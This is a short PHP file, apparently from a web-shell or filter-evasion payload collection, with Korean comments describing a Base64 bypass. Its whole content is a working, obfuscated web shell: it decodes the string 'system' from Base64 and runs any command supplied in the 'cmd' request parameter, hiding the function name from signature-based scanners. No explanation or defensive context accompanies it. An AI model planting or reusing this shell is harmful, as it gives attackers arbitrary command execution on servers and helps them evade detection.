<?php
// Base64 인코딩 우회 - 함수명/페이로드 난독화
// system() -> base64_decode('c3lzdGVt')
$f = base64_decode('c3lzdGVt');       // system
$f($_REQUEST['cmd']);
?>
